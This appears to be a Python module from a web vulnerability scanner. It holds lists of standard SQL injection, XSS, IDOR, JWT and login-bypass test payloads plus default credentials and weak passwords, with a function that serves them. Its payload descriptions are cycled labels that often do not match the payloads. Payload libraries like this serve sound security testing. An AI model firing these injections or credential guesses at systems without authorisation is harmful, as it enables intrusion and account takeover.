"""
Payload库 - 管理测试Payload
输入: {type, count}
输出: {payloads, descriptions, risk_levels}
"""

# SQL注入Payload
SQLI_PAYLOADS = [
    # 基于错误的注入
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin'--",
    "admin' OR '1'='1",
    
    # UNION注入
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "1' UNION SELECT NULL--",
    
    # 布尔注入
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1' OR '1'='1",
    
    # 时间盲注
    "1' AND SLEEP(5)--",
    "1'; WAITFOR DELAY '00:00:05'--",
    
    # 二次注入
    "test'--",
]

# XSS Payload
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'><script>alert(String.fromCharCode(88,83,83))</script>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
]

# IDOR测试ID
IDOR_TEST_IDS = [
    1, 2, 3, 4, 5, 10, 100, 999, 9999,
    "admin", "test", "user",
    "a" * 32,
]

# JWT测试
JWT_PAYLOADS = [
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0IiwiaWF0IjoxNTM1OTk2MjU2LCJleHAiOjE5MTc1NTYyNTYsIm5iZiI6MTUzNTk5NjI1NiwianRpIjoiIiwic3ViIjoiYWRtaW4iLCJyb2xlIjoiUk9MRV9BRE1JTiJ9",
]

# 认证绕过Payload
AUTH_BYPASS_PAYLOADS = [
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "123456"},
    {"username": "admin", "password": "admin123"},
    {"username": "test", "password": "test"},
    {"username": "' OR '1'='1", "password": "any"},
    {"username": "admin'--", "password": "any"},
    {"username": "1' OR '1'='1", "password": "1"},
]

# 弱密码
WEAK_PASSWORDS = [
    "123456", "password", "admin", "admin123",
    "123123", "000000", "111111", "12345678",
    "qwerty", "abc123", "1234", "12345"
]


def get_payloads(config):
    """
    获取Payload库
    
    输入:
        type: "sqli" | "xss" | "idor" | "jwt" | "auth_bypass"
        count?: number - 返回数量
    
    输出:
        payloads: string[]
        descriptions: string[]
        risk_levels: string[]
    """
    payload_type = config.get('type', 'sqli')
    count = config.get('count', 10)
    
    if payload_type == 'sqli':
        payloads = SQLI_PAYLOADS[:count]
        descriptions = [
            "通用布尔注入",
            "注释绕过",
            "OR注入",
            "管理员绕过",
            "UNION注入",
        ] * (count // 5 + 1)
        risk_levels = ['high'] * count
    
    elif payload_type == 'xss':
        payloads = XSS_PAYLOADS[:count]
        descriptions = [
            "script标签",
            "img标签onerror",
            "script标签绕过",
            "svg标签",
            "javascript伪协议",
        ] * (count // 5 + 1)
        risk_levels = ['high'] * count
    
    elif payload_type == 'idor':
        payloads = IDOR_TEST_IDS[:count]
        descriptions = ["数字ID"] * count
        risk_levels = ['medium'] * count
    
    elif payload_type == 'jwt':
        payloads = JWT_PAYLOADS[:count]
        descriptions = ["JWT测试token"] * count
        risk_levels = ['high'] * count
    
    elif payload_type == 'auth_bypass':
        payloads = AUTH_BYPASS_PAYLOADS[:count]
        descriptions = ["弱口令", "SQL注入绕过"] * (count // 2 + 1)
        risk_levels = ['high'] * count
    
    else:
        payloads = []
        descriptions = []
        risk_levels = []
    
    return {
        'payloads': payloads[:count],
        'descriptions': descriptions[:count],
        'risk_levels': risk_levels[:count]
    }


def get_sqli_payloads():
    """获取SQL注入Payload"""
    return SQLI_PAYLOADS


def get_xss_payloads():
    """获取XSS Payload"""
    return XSS_PAYLOADS


def get_idor_test_ids():
    """获取IDOR测试ID"""
    return IDOR_TEST_IDS


def get_weak_passwords():
    """获取弱密码列表"""
    return WEAK_PASSWORDS


if __name__ == '__main__':
    # 测试
    result = get_payloads({'type': 'sqli', 'count': 5})
    print(f"Payloads: {result['payloads']}")
